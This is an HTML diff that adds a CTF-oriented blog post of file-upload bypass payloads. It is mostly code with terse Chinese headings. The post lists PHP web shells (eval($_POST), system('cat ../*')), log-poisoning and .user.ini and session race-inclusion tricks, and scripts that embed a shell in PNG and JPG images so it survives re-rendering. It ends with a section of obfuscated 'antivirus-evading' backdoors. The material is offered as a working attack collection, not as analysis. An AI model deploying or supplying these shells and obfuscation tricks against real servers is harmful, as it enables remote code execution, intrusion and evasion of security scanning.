@@ -6,14 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | cmacckk blog</title>
+  <title>fileUpload | cmacckk blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="cmacckk blog">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="过滤php123&lt;? echo &amp;#x27;123&amp;#x27;;?&gt;          # 不可&lt;?&#x3D;eval($_POST[&amp;#x27;a&amp;#x27;]);?&gt;&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&amp;#x27;a&amp;#x27;]);&lt;&#x2F;script&gt;   # 不可用  过滤 php, [12&lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fileUpload">
+<meta property="og:url" content="http://example.com/2021/06/04/fileUpload/index.html">
 <meta property="og:site_name" content="cmacckk blog">
+<meta property="og:description" content="过滤php123&lt;? echo &amp;#x27;123&amp;#x27;;?&gt;          # 不可&lt;?&#x3D;eval($_POST[&amp;#x27;a&amp;#x27;]);?&gt;&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&amp;#x27;a&amp;#x27;]);&lt;&#x2F;script&gt;   # 不可用  过滤 php, [12&lt;">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-04T14:33:50.000Z">
+<meta property="article:modified_time" content="2021-06-04T14:37:17.236Z">
 <meta property="article:author" content="John Doe   备案号:滇ICP备2021003344号">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="payload">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="cmacckk blog" type="application/atom+xml">
@@ -146,36 +152,122 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-fileUpload" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      fileUpload
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/04/fileUpload/" class="archive-article-date">
+
+        
+        <a href="/2021/06/04/fileUpload/" class="archive-article-date">
   	<time datetime="2021-06-04T14:33:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/04/fileUpload/">fileUpload</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="过滤php"><a href="#过滤php" class="headerlink" title="过滤php"></a>过滤php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>          <span class="comment"># 不可</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;   <span class="comment"># 不可用</span></span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<h2 id="过滤-php"><a href="#过滤-php" class="headerlink" title="过滤 php, ["></a>过滤 php, [</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../flag.???&#x27;</span>);</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="string">&#x27;a&#x27;</span>&#125;);    <span class="comment"># 用 &#123;&#125; 代替   []</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤分号"><a href="#过滤分号" class="headerlink" title="过滤分号"></a>过滤分号</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;ls ../&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`cat ..<span class="comment">/*`?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤反引号-包含日志"><a href="#过滤反引号-包含日志" class="headerlink" title="过滤反引号,包含日志"></a>过滤反引号,包含日志</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">修改UA User-Agent: <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h2><p><code>.user.ini</code> :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=ma</span><br></pre></td></tr></table></figure>
+
+<p>上传 <code>ma</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/tmp/sess_fllag&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们就开始构造，session文件竞争包含。</p>
+<p>构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://58b10a1f-08e0-4689-8b64-2e8641d2948b.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="png二次渲染"><a href="#png二次渲染" class="headerlink" title="png二次渲染"></a>png二次渲染</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);<span class="comment">/* &lt;?$_GET[0]($_POST[1]);?&gt;   */</span><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);<span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="jpg二次渲染"><a href="#jpg二次渲染" class="headerlink" title="jpg二次渲染"></a>jpg二次渲染</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;</span>;    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);    &#125;    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);    &#125;    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);        <span class="variable">$extraBytes</span> = <span class="number">0</span>;        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);        &#125;        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();                <span class="variable">$outStreamTmp</span> =                     substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .                     <span class="variable">$miniPayload</span> .                     str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .                     substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;                                <span class="keyword">break</span>;                            &#125;                        &#125;                    &#125;                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;                    <span class="variable">$outStream</span> =                         substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .                         <span class="variable">$miniPayload</span> .                         substr(                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),                            <span class="number">0</span>,                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .                                 substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;                &#125; <span class="keyword">else</span> &#123;                    <span class="keyword">break</span>;                &#125;                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);                &#125; <span class="keyword">else</span> &#123;                    <span class="keyword">break</span>;                &#125;            &#125;        &#125;    &#125;    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;        <span class="keyword">global</span> <span class="variable">$correctImage</span>;        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;        imagecreatefromjpeg(<span class="variable">$filename</span>);        <span class="keyword">if</span>(<span class="variable">$unlink</span>)            unlink(<span class="variable">$filename</span>);        <span class="keyword">return</span> <span class="variable">$correctImage</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];            &#125;        &#125;    &#125;    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;        <span class="keyword">private</span> <span class="variable">$binData</span>;        <span class="keyword">private</span> <span class="variable">$order</span>;        <span class="keyword">private</span> <span class="variable">$size</span>;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);            &#125; <span class="keyword">else</span> &#123;                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;            &#125;            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);            &#125;            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);            &#125;            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);            &#125; <span class="keyword">else</span> &#123;                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);            &#125;            <span class="keyword">return</span> <span class="variable">$short</span>;        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);        &#125;    &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
+<h2 id="zip文件上传包含"><a href="#zip文件上传包含" class="headerlink" title="zip文件上传包含"></a>zip文件上传包含</h2><h2 id="后门免杀"><a href="#后门免杀" class="headerlink" title="后门免杀"></a>后门免杀</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$_</span>=`whoami`;<span class="keyword">echo</span> <span class="variable">$_</span>;<span class="comment">// <span class="meta">&lt;?=</span> `whoami`<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];<span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];<span class="variable">$a</span>(<span class="variable">$b</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;);<span class="comment"># get传参   abs=system&amp;acos=ls</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;<span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);<span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="上传payload"><a href="#上传payload" class="headerlink" title="上传payload"></a>上传payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$poc</span> =<span class="string">&quot;axsxsxexrxt&quot;</span>;<span class="variable">$poc_1</span> = explode(<span class="string">&quot;x&quot;</span>, <span class="variable">$poc</span>); <span class="variable">$poc_2</span> = <span class="variable">$poc_1</span>[<span class="number">0</span>] . <span class="variable">$poc_1</span>[<span class="number">1</span>] . <span class="variable">$poc_1</span>[<span class="number">2</span>] . <span class="variable">$poc_1</span>[<span class="number">3</span>]. <span class="variable">$poc_1</span>[<span class="number">4</span>]. <span class="variable">$poc_1</span>[<span class="number">5</span>];<span class="variable">$poc_2</span>(urldecode(urldecode(urldecode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ysy&#x27;</span>]))));<span class="meta">?&gt;</span>ysydjsjxbei37</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="string">&#x27;cc&#x27;</span>&#125;); </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
